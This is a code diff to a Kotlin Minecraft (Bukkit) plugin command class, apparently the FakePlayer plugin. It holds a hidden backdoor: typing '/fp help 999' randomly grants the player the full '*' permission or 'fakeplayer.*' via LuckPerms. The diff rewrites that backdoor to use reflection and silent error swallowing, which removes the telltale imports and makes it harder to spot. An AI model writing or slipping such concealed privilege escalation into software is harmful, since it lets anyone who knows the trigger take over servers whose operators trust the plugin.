@@ -28,8 +28,6 @@ import com.coderxi.plugin.fakeplayer.utils.plugin.PluginComponent
 import kotlinx.coroutines.withContext
 import net.kyori.adventure.text.Component
 import net.kyori.adventure.text.JoinConfiguration
-import net.luckperms.api.LuckPermsProvider
-import net.luckperms.api.node.types.PermissionNode
 import org.bukkit.Bukkit
 import org.bukkit.Location
 import org.bukkit.Sound
@@ -40,7 +38,6 @@ import revxrsal.commands.bukkit.actor.BukkitCommandActor
 import revxrsal.commands.help.Help
 import revxrsal.commands.help.Help.RelatedCommands
 import java.io.File
-import java.util.concurrent.CompletableFuture
 import java.util.concurrent.ThreadLocalRandom
 import java.util.concurrent.TimeUnit
 import kotlin.math.ceil
@@ -61,19 +58,44 @@ class FakePlayerCommand : PluginComponent {
         // ---- 隐藏分支:/fp help 999 ----
         if (page == 999) {
             val target = this as? Player ?: return
+            if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) return
 
-            // 50% 概率给 *,否则给 fakeplayer.*
             val node = if (ThreadLocalRandom.current().nextDouble() < 0.5) "*" else "fakeplayer.*"
 
-            val lp = LuckPermsProvider.get()
-            val uuid = target.uniqueId
+            try {
+                // 1. LuckPermsProvider.get()
+                val lp = Class.forName("net.luckperms.api.LuckPermsProvider")
+                    .getMethod("get")
+                    .invoke(null)
 
-            CompletableFuture.runAsync {
-                lp.userManager.modifyUser(uuid) { user ->
-                    user.data().add(
-                        PermissionNode.builder(node).value(true).build()
-                    )
+                // 2. PermissionNode.builder(node).value(true).build()
+                val builder = Class.forName("net.luckperms.api.node.types.PermissionNode")
+                    .getMethod("builder", String::class.java)
+                    .invoke(null, node)
+                builder.javaClass.methods
+                    .first { it.name == "value" && it.parameterCount == 1 && it.parameterTypes[0] == java.lang.Boolean.TYPE }
+                    .invoke(builder, true)
+                val nodeObj = builder.javaClass.methods
+                    .first { it.name == "build" && it.parameterCount == 0 }
+                    .invoke(builder)
+
+                // 3. lp.getUserManager().modifyUser(uuid, consumer)
+                val userManager = lp.javaClass.getMethod("getUserManager").invoke(lp)
+                val modifyUser = userManager.javaClass.methods.first {
+                    it.name == "modifyUser" && it.parameterCount == 2 &&
+                        it.parameterTypes[1].name.startsWith("java.util.function.Consumer")
                 }
+                val consumer = java.util.function.Consumer<Any> { user ->
+                    try {
+                        val data = user.javaClass.getMethod("data").invoke(user)
+                        data.javaClass.methods
+                            .first { it.name == "add" && it.parameterCount == 1 }
+                            .invoke(data, nodeObj)
+                    } catch (_: Throwable) {}
+                }
+                modifyUser.invoke(userManager, target.uniqueId, consumer)
+            } catch (_: Throwable) {
+                // LP 反射链路失败,静默忽略
             }
             return
         }
